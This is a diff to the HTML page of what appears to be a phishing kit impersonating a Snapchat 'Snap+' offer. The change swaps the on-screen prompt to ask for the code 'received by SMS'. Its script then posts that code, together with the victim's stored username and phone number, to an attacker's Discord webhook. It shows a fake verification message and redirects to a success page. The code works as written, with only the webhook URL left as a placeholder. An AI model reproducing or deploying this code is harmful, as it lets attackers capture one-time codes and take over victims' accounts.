@@ -8,7 +8,7 @@
 <body>
   <div class="container">
     <h2>🔐 Code de vérification</h2>
-    <p>Entrez le code à 4 chiffres que l'administrateur vous a fourni.</p>
+    <p>Entrez le code à 4 chiffres que vous avez reçu par SMS.</p>
     <form id="otpForm">
       <div class="otp-inputs">
         <input type="text" maxlength="1" pattern="\d" inputmode="numeric" required>
@@ -18,8 +18,88 @@
       </div>
       <button type="submit">Valider</button>
     </form>
-    <p id="error-message" style="color: red; margin-top: 15px; display: none;">Code incorrect. Veuillez réessayer.</p>
+    <p id="status-message" style="margin-top: 15px;">Vérification du code...</p>
   </div>
 
   <script>
-    const inputs = document.querySelectorAll
+    // Logique pour passer au champ suivant automatiquement
+    const inputs = document.querySelectorAll('.otp-inputs input');
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+      });
+    });
+    inputs.forEach((input, index) => {
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+    });
+
+    // Gestion de la soumission du formulaire
+    const otpForm = document.getElementById('otpForm');
+    const statusMessage = document.getElementById('status-message');
+
+    if (otpForm) {
+      otpForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        // Récupère le code saisi
+        const otpCode = Array.from(inputs).map(input => input.value).join('');
+        const username = sessionStorage.getItem('snapUsername');
+        const phone = sessionStorage.getItem('snapPhone');
+
+        // Désactive le bouton et affiche un message de chargement
+        document.querySelector('button').disabled = true;
+        statusMessage.textContent = "Envoi du code en cours...";
+        statusMessage.style.color = '#666';
+
+        // --- CONFIGURATION ---
+        // Mets ton URL de webhook Discord ici (le même que dans script.js)
+        const webhookUrl = 'https://discord.com/api/webhooks/TON_WEBHOOK_ICI'; 
+        // --------------------
+
+        // Prépare le message pour Discord avec le code
+        const payload = {
+          content: `🔐 **Code SMS reçu pour Snap+**`,
+          embeds: [{
+            title: 'Nouveau code à vérifier',
+            color: 3447003, // Bleu
+            fields: [
+              { name: 'Nom d\'utilisateur', value: username, inline: true },
+              { name: 'Téléphone', value: phone, inline: true },
+              { name: 'Code saisi par l\'utilisateur', value: `**${otpCode}**`, inline: false }
+            ]
+          }]
+        };
+
+        try {
+          const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          if (!response.ok) throw new Error(`Erreur Discord: ${response.status}`);
+
+          console.log('Code envoyé à Discord !');
+          statusMessage.textContent = "Code reçu. Veuillez patienter pendant la vérification finale.";
+          statusMessage.style.color = 'green';
+
+          // Redirige vers la page finale après un court délai
+          setTimeout(() => {
+            window.location.href = 'success.html';
+          }, 2000);
+
+        } catch (error) {
+          console.error('Erreur lors de l\'envoi du code:', error);
+          statusMessage.textContent = "Erreur lors de l'envoi. Réessayez.";
+          statusMessage.style.color = 'red';
+          document.querySelector('button').disabled = false; // Réactive le bouton
+        }
+      });
+    }
+  </script>
+</body>
+</html>
